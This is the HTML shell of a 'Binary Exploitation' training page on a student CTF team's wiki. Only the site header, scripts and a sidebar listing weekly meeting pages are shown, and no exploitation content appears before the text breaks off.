
<!doctype html>
<html lang="en" class="no-js">
  <head>
    
      <meta charset="utf-8">
      <meta name="viewport" content="width=device-width,initial-scale=1">
      
        <meta name="description" content="Wiki project for COMPASS CTF, for usage of information sharing, collection, and reference. The contents are contributed by the students of COMPASS CTF team.">
      
      
      
        <link rel="canonical" href="https://wiki.compass.college/Training/Material/Binary%20Exploitation/">
      
      
        <link rel="prev" href="../../Varsity%20Competition%20Training%20Model/">
      
      
        <link rel="next" href="../Cryptography/">
      
      
      <link rel="icon" href="../../../assets/favicon.ico">
      <meta name="generator" content="mkdocs-1.6.0, mkdocs-material-9.5.23">
    
    
      
        <title>Binary Exploitation - COMPASS CTF Wiki</title>
      
    
    
      <link rel="stylesheet" href="../../../assets/stylesheets/main.6543a935.min.css">
      
        
        <link rel="stylesheet" href="../../../assets/stylesheets/palette.06af60db.min.css">
      
      


    
    
      
    
    
      
        
        
        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Oswald:300,300i,400,400i,700,700i%7CConsolas:400,400i,700,700i&display=fallback">
        <style>:root{--md-text-font:"Oswald";--md-code-font:"Consolas"}</style>
      
    
    
    <script>__md_scope=new URL("../../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
    
      
  


  
  

<script id="__analytics">function __md_analytics(){function n(){dataLayer.push(arguments)}window.dataLayer=window.dataLayer||[],n("js",new Date),n("config","G-PJ9W2F97F4"),document.addEventListener("DOMContentLoaded",function(){document.forms.search&&document.forms.search.query.addEventListener("blur",function(){this.value&&n("event","search",{search_term:this.value})}),document$.subscribe(function(){var a=document.forms.feedback;if(void 0!==a)for(var e of a.querySelectorAll("[type=submit]"))e.addEventListener("click",function(e){e.preventDefault();var t=document.location.pathname,e=this.getAttribute("data-md-value");n("event","feedback",{page:t,data:e}),a.firstElementChild.disabled=!0;e=a.querySelector(".md-feedback__note [data-md-value='"+e+"']");e&&(e.hidden=!1)}),a.hidden=!1}),location$.subscribe(function(e){n("config","G-PJ9W2F97F4",{page_path:e.pathname})})});var e=document.createElement("script");e.async=!0,e.src="https://www.googletagmanager.com/gtag/js?id=G-PJ9W2F97F4",document.getElementById("__analytics").insertAdjacentElement("afterEnd",e)}</script>
  
    <script>"undefined"!=typeof __md_analytics&&__md_analytics()</script>
  

    
    
    
  </head>
  
  
    
    
      
    
    
    
    
    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo">
  
    
    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
    <label class="md-overlay" for="__drawer"></label>
    <div data-md-component="skip">
      
        
        <a href="#binary-exploitation" class="md-skip">
          Skip to content
        </a>
      
    </div>
    <div data-md-component="announce">
      
    </div>
    
    
      

  

<header class="md-header md-header--shadow md-header--lifted" data-md-component="header">
  <nav class="md-header__inner md-grid" aria-label="Header">
    <a href="../../.." title="COMPASS CTF Wiki" class="md-header__button md-logo" aria-label="COMPASS CTF Wiki" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 89 89">
  <path d="M3.136,17.387l0,42.932l42.932,21.467l-42.932,-64.399Z" />
  <path d="M21.91,8l42.933,64.398l-18.775,9.388l-42.932,-64.399l18.774,-9.387Z" style="fill-opacity: 0.5" />
  <path d="M67.535,17.387l-27.262,18.156l21.878,32.818l5.384,2.691l0,-53.665Z" />
  <path d="M67.535,17.387l0,53.666l18.774,-9.388l0,-53.665l-18.774,9.387Z" style="fill-opacity: 0.25" />
</svg>

    </a>
    <label class="md-header__button md-icon" for="__drawer">
      
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
    </label>
    <div class="md-header__title" data-md-component="header-title">
      <div class="md-header__ellipsis">
        <div class="md-header__topic">
          <span class="md-ellipsis">
            COMPASS CTF Wiki
          </span>
        </div>
        <div class="md-header__topic" data-md-component="header-topic">
          <span class="md-ellipsis">
            
              Binary Exploitation
            
          </span>
        </div>
      </div>
    </div>
    
      
        <form class="md-header__option" data-md-component="palette">
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_0">
    
      <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_1" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 0-7 7c0 2.38 1.19 4.47 3 5.74V17a1 1 0 0 0 1 1h6a1 1 0 0 0 1-1v-2.26c1.81-1.27 3-3.36 3-5.74a7 7 0 0 0-7-7M9 21a1 1 0 0 0 1 1h4a1 1 0 0 0 1-1v-1H9v1Z"/></svg>
      </label>
    
  
    
    
    
    <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="indigo" data-md-color-accent="indigo"  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_1">
    
      <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_0" hidden>
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 2a7 7 0 0 1 7 7c0 2.38-1.19 4.47-3 5.74V17a1 1 0 0 1-1 1H9a1 1 0 0 1-1-1v-2.26C6.19 13.47 5 11.38 5 9a7 7 0 0 1 7-7M9 21v-1h6v1a1 1 0 0 1-1 1h-4a1 1 0 0 1-1-1m3-17a5 5 0 0 0-5 5c0 2.05 1.23 3.81 3 4.58V16h4v-2.42c1.77-.77 3-2.53 3-4.58a5 5 0 0 0-5-5Z"/></svg>
      </label>
    
  
</form>
      
    
    
      <script>var media,input,key,value,palette=__md_get("__palette");if(palette&&palette.color){"(prefers-color-scheme)"===palette.color.media&&(media=matchMedia("(prefers-color-scheme: light)"),input=document.querySelector(media.matches?"[data-md-color-media='(prefers-color-scheme: light)']":"[data-md-color-media='(prefers-color-scheme: dark)']"),palette.color.media=input.getAttribute("data-md-color-media"),palette.color.scheme=input.getAttribute("data-md-color-scheme"),palette.color.primary=input.getAttribute("data-md-color-primary"),palette.color.accent=input.getAttribute("data-md-color-accent"));for([key,value]of Object.entries(palette.color))document.body.setAttribute("data-md-color-"+key,value)}</script>
    
    
    
      <label class="md-header__button md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
      </label>
      <div class="md-search" data-md-component="search" role="dialog">
  <label class="md-search__overlay" for="__search"></label>
  <div class="md-search__inner" role="search">
    <form class="md-search__form" name="search">
      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
      <label class="md-search__icon md-icon" for="__search">
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
        
        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
      </label>
      <nav class="md-search__options" aria-label="Search">
        
          <a href="javascript:void(0)" class="md-search__icon md-icon" title="Share" aria-label="Share" data-clipboard data-clipboard-text="" data-md-component="search-share" tabindex="-1">
            
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M18 16.08c-.76 0-1.44.3-1.96.77L8.91 12.7c.05-.23.09-.46.09-.7 0-.24-.04-.47-.09-.7l7.05-4.11c.54.5 1.25.81 2.04.81a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3c0 .24.04.47.09.7L8.04 9.81C7.5 9.31 6.79 9 6 9a3 3 0 0 0-3 3 3 3 0 0 0 3 3c.79 0 1.5-.31 2.04-.81l7.12 4.15c-.05.21-.08.43-.08.66 0 1.61 1.31 2.91 2.92 2.91 1.61 0 2.92-1.3 2.92-2.91A2.92 2.92 0 0 0 18 16.08Z"/></svg>
          </a>
        
        <button type="reset" class="md-search__icon md-icon" title="Clear" aria-label="Clear" tabindex="-1">
          
          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
        </button>
      </nav>
      
        <div class="md-search__suggest" data-md-component="search-suggest"></div>
      
    </form>
    <div class="md-search__output">
      <div class="md-search__scrollwrap" data-md-scrollfix>
        <div class="md-search-result" data-md-component="search-result">
          <div class="md-search-result__meta">
            Initializing search
          </div>
          <ol class="md-search-result__list" role="presentation"></ol>
        </div>
      </div>
    </div>
  </div>
</div>
    
    
      <div class="md-header__source">
        <a href="https://github.com/lyther/wiki" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    lyther/wiki
  </div>
</a>
      </div>
    
  </nav>
  
    
      
<nav class="md-tabs" aria-label="Tabs" data-md-component="tabs">
  <div class="md-grid">
    <ul class="md-tabs__list">
      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../.." class="md-tabs__link">
          
  
  Abstract

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../Book/CTF%20Competition%20Starter%20Guide/" class="md-tabs__link">
          
  
  Book Collection

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../CS315/Introduction/" class="md-tabs__link">
          
  
  CS315 Material

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../CTF/CTF%20and%20Hacker%20Attitude/" class="md-tabs__link">
          
  
  CTF Basic and Tutorial

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../Paper/Artificial%20Intelligence/Cert-RNN%20Towards%20Certifying%20the%20Robustness%20of%20Recurrent/" class="md-tabs__link">
          
  
  Research

        </a>
      </li>
    
  

    
  

      
        
  
  
  
    
    
      
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../Tool/Windows/" class="md-tabs__link">
          
  
  Tool Collection

        </a>
      </li>
    
  

    
  

      
        
  
  
    
  
  
    
    
      <li class="md-tabs__item md-tabs__item--active">
        <a href="../../Varsity%20Competition%20Training%20Model/" class="md-tabs__link">
          
  
  Training Schedule

        </a>
      </li>
    
  

      
        
  
  
  
    
    
      
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../Website/Forum/kanxue/" class="md-tabs__link">
          
  
  Website Collection

        </a>
      </li>
    
  

    
  

      
        
  
  
  
    
    
      <li class="md-tabs__item">
        <a href="../../../Writeup/2024ciscn1/ciscn2024_compass_wp/" class="md-tabs__link">
          
  
  Writeup

        </a>
      </li>
    
  

      
    </ul>
  </div>
</nav>
    
  
</header>
    
    <div class="md-container" data-md-component="container">
      
      
        
      
      <main class="md-main" data-md-component="main">
        <div class="md-main__inner md-grid">
          
            
              
              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
                <div class="md-sidebar__scrollwrap">
                  <div class="md-sidebar__inner">
                    


  


<nav class="md-nav md-nav--primary md-nav--lifted" aria-label="Navigation" data-md-level="0">
  <label class="md-nav__title" for="__drawer">
    <a href="../../.." title="COMPASS CTF Wiki" class="md-nav__button md-logo" aria-label="COMPASS CTF Wiki" data-md-component="logo">
      
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 89 89">
  <path d="M3.136,17.387l0,42.932l42.932,21.467l-42.932,-64.399Z" />
  <path d="M21.91,8l42.933,64.398l-18.775,9.388l-42.932,-64.399l18.774,-9.387Z" style="fill-opacity: 0.5" />
  <path d="M67.535,17.387l-27.262,18.156l21.878,32.818l5.384,2.691l0,-53.665Z" />
  <path d="M67.535,17.387l0,53.666l18.774,-9.388l0,-53.665l-18.774,9.387Z" style="fill-opacity: 0.25" />
</svg>

    </a>
    COMPASS CTF Wiki
  </label>
  
    <div class="md-nav__source">
      <a href="https://github.com/lyther/wiki" title="Go to repository" class="md-source" data-md-component="source">
  <div class="md-source__icon md-icon">
    
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><!--! Font Awesome Free 6.5.2 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2024 Fonticons, Inc.--><path d="M439.55 236.05 244 40.45a28.87 28.87 0 0 0-40.81 0l-40.66 40.63 51.52 51.52c27.06-9.14 52.68 16.77 43.39 43.68l49.66 49.66c34.23-11.8 61.18 31 35.47 56.69-26.49 26.49-70.21-2.87-56-37.34L240.22 199v121.85c25.3 12.54 22.26 41.85 9.08 55a34.34 34.34 0 0 1-48.55 0c-17.57-17.6-11.07-46.91 11.25-56v-123c-20.8-8.51-24.6-30.74-18.64-45L142.57 101 8.45 235.14a28.86 28.86 0 0 0 0 40.81l195.61 195.6a28.86 28.86 0 0 0 40.8 0l194.69-194.69a28.86 28.86 0 0 0 0-40.81z"/></svg>
  </div>
  <div class="md-source__repository">
    lyther/wiki
  </div>
</a>
    </div>
  
  <ul class="md-nav__list" data-md-scrollfix>
    
      
      
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1" >
        
          
          <label class="md-nav__link" for="__nav_1" id="__nav_1_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Abstract
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="1" aria-labelledby="__nav_1_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1">
            <span class="md-nav__icon md-icon"></span>
            Abstract
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../.." class="md-nav__link">
        
  
  <span class="md-ellipsis">
    COMPASS CTF
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../member/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Members
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../award/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Competition Awards
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../related/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    Related Links
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_5" >
        
          
          <label class="md-nav__link" for="__nav_1_5" id="__nav_1_5_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    Meeting
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="2" aria-labelledby="__nav_1_5_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1_5">
            <span class="md-nav__icon md-icon"></span>
            Meeting
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/CTF%20Week%20Meeting%202023-01-12/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2023-01-12
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/CTF%20Week%20Meeting%202023-01-19/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2023-01-19
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/CTF%20Week%20Meeting%202023-02-02/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2023-02-02
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/CTF%20Week%20Meeting%202023-02-09/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2023-02-09
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/CTF%20Week%20Meeting%202023-02-16/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2023-02-16
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/CTF%20Week%20Meeting%202023-02-23/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2023-02-23
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/CTF%20Week%20Meeting%202023-03-02/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2023-03-02
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/CTF%20Week%20Meeting%202023-03-09/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2023-03-09
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/CTF%20Week%20Meeting%202023-03-16/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2023-03-16
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/CTF%20Week%20Meeting%202023-03-23/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2023-03-23
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/CTF%20Week%20Meeting%202023-03-30/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2023-03-30
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/CTF%20Week%20Meeting%202023-04-06/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2023-04-06
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/CTF%20Week%20Meeting%202023-04-20/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2023-04-20
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/CTF%20Week%20Meeting%202023-04-27/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2023-04-27
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/CTF%20Week%20Meeting%202023-05-11/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2023-05-11
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/CTF%20Week%20Meeting%202023-06-29/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2023-06-29
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_5_17" >
        
          
          <label class="md-nav__link" for="__nav_1_5_17" id="__nav_1_5_17_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    2022 First Half
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_5_17_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1_5_17">
            <span class="md-nav__icon md-icon"></span>
            2022 First Half
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-17/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-02-17
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-02-24/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-02-24
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-03/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-03-03
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-10/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-03-10
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-17/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-03-17
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-24/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-03-24
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-03-31/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-03-31
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-07/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-04-07
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-14/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-04-14
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-21/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-04-21
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-04-28/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-04-28
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-05/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-05-05
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-13/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-05-13
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-19/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-05-19
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-05-26/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-05-26
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-03/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-06-03
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-09/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-06-09
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-16/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-06-16
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20First%20Half/CTF%20Week%20Meeting%202022-06-23/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-06-23
  </span>
  

      </a>
    </li>
  

              
            
          </ul>
        </nav>
      
    </li>
  

              
            
              
                
  
  
  
  
    
    
    
      
      
    
    
    <li class="md-nav__item md-nav__item--nested">
      
        
        
        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_1_5_18" >
        
          
          <label class="md-nav__link" for="__nav_1_5_18" id="__nav_1_5_18_label" tabindex="0">
            
  
  <span class="md-ellipsis">
    2022 Last Half
  </span>
  

            <span class="md-nav__icon md-icon"></span>
          </label>
        
        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_1_5_18_label" aria-expanded="false">
          <label class="md-nav__title" for="__nav_1_5_18">
            <span class="md-nav__icon md-icon"></span>
            2022 Last Half
          </label>
          <ul class="md-nav__list" data-md-scrollfix>
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-07/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-07-07
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-14/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-07-14
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-21/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-07-21
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-07-28/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-07-28
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
      <a href="../../../Meeting/2022%20Last%20Half/CTF%20Week%20Meeting%202022-08-04/" class="md-nav__link">
        
  
  <span class="md-ellipsis">
    CTF Week Meeting 2022-08-04
  </span>
  

      </a>
    </li>
  

              
            
              
                
  
  
  
  
    <li class="md-nav__item">
